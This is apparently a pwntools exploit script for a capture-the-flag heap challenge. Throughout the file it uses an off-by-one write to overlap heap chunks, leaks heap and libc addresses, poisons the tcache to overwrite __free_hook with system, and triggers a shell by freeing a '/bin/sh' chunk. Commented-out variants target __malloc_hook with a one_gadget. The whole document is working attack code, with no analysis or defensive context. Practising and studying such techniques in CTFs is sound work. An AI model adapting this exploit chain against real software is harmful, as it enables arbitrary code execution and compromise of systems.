#!/usr/bin/python3
#-*- coding: utf-8 -*-
from pwn import *

context.log_level = 'debug'
context.arch='amd64'
context.terminal = ['tmux','sp','-h','-l','120']

remote_service = "node4.buuoj.cn:27745"
remote_service = remote_service.strip().split(":")
# p = remote(remote_service[0], int(remote_service[1]))
filename = "./pwn"
# filename = "./ez_kiwi"
p = process(filename)
e = ELF(filename, checksec=False)
l = ELF(e.libc.path, checksec=False)

rl = lambda a=False : p.recvline(a)
ru = lambda a,b=True : p.recvuntil(a,b)
rn = lambda x : p.recvn(x)
sn = lambda x : p.send(x)
sl = lambda x : p.sendline(x)
sa = lambda a,b : p.sendafter(a,b)
sla = lambda a,b : p.sendlineafter(a,b)
irt = lambda : p.interactive()
dbg = lambda text=None : gdb.attach(p, text)
lg = lambda s : log.info('\033[1;31;40m %s --> 0x%x \033[0m' % (s, eval(s)))
uu32 = lambda data : u32(data.ljust(4, b'\x00'))
uu64 = lambda data : u64(data.ljust(8, b'\x00'))
def debugPID():
	lg("p.pid")
	input()
	# pass

def cmd(choice):
	ru(b'>> ')
	sl(str(choice).encode())
def add(idx, size, data=b'aaa'):
	cmd(1)
	ru(b'How much do you want?\n')
	sl(str(size).encode())		# size <= 0x100
	ru(b'Which one do you want to put?\n')
	sl(str(idx).encode())
	ru(b'Tell me your idea:\n')
	sn(data)
def edit(idx, data):
	# off_by_one
	cmd(4)
	ru(b'Which one do you want to change?\n')
	sl(str(idx).encode())
	ru(b'Change your idea:\n')
	sn(data)
def show(idx):
	cmd(3)
	ru(b'Which one do you want to look?\n')
	sl(str(idx).encode())
	ru(b'content: ')
def delete(idx):
	cmd(2)
	ru(b'Which one do you want to remove?\n')
	sl(str(idx).encode())

main_arena_offset = 0x1ecb80
# main_arena_offset = 0x1ecb80 - 0x1000
one_gadget_off = 0xe6c7e


malloc_hook_offset = l.symbols['__malloc_hook']


ru(b' Before the game starts, please give me your name:\n')
sl(b'aaa')

# add(0 ,0x10)
# delete(0)
# debugPID()

add(5, 0x28)

add(0, 0x28)

add(1, 0x28)
add(2, 0x88)
add(0x9, 0x88)
delete(0x9)
delete(2)

edit(0, b'a'*0x28 + p8(0xc1))
add(3, 0x28)
edit(1, b'a'*0x28 + p8(0x81))
delete(1)
add(4, 0xb8, b'a'*0x38)
# debugPID()

show(4)
leak_addr = uu64(ru(b'\n', "drop")[0x38:0x38+6])
lg("leak_addr")
assert leak_addr >= 0x500000000000

edit(4, b'a'*0x28 + p64(0x91) + p64(leak_addr) + b'\n')
add(1, 0x88)
# debugPID()
add(2, 0x88, p64(0) + p64(0) + p64(0x10 << 0x20))

delete(4)

edit(5, b'a'*0x28 + p8(0xf1))
delete(0)
add(0, 0xe8, b'a'*0x30)
show(0)
main_arena = uu64(ru(b'\n', "drop")[0x30:0x30+6]) - 0x60
libc_base = main_arena - main_arena_offset
lg("libc_base")
assert libc_base >= 0x500000000000

edit(0, b'a'*0x28 + p64(0xc1) + 2*p64(libc_base + main_arena_offset) + b'\n')
edit(5, b'a'*0x28 + p8(0x91))
delete(0)

# edit(2, p64(0) + p64(0) + p64(0) + b'\n')
# edit(0, b'a'*0x28 + p64(0xa1) + 2*p64(libc_base + malloc_hook_offset - 0x33) + b'\n')
# debugPID()
# add(6, 0x88)

# exit_hook=0x222060+3848
# debugPID()
edit(2, p64(1) + p64(0) + p64(0) + p64(0)*13 + p64(libc_base + l.symbols['__free_hook']) + b'\n')
lg("libc_base + l.symbols['__free_hook']")
debugPID()
# add(6, 0x18, p64(libc_base + one_gadget_off) + b'\n')
add(0, 0x10)
edit(0, p64(libc_base + l.symbols['system']) + b'\n')
debugPID()
edit(1, b'/bin/sh\n')
delete(1)

# edit(2, p64(1) + p64(0) + p64(0) + p64(0)*13 + p64(libc_base + l.symbols['__malloc_hook']) + b'\n')
# lg("libc_base + l.symbols['__malloc_hook']")
# debugPID()
# # add(6, 0x18, p64(libc_base + one_gadget_off) + b'\n')
# add(0, 0x10)
# edit(0, p64(libc_base+ one_gadget_off) + b'\n')
# debugPID()
# # edit(1, b'/bin/sh\n')
# # delete(1)

# debugPID()
irt()
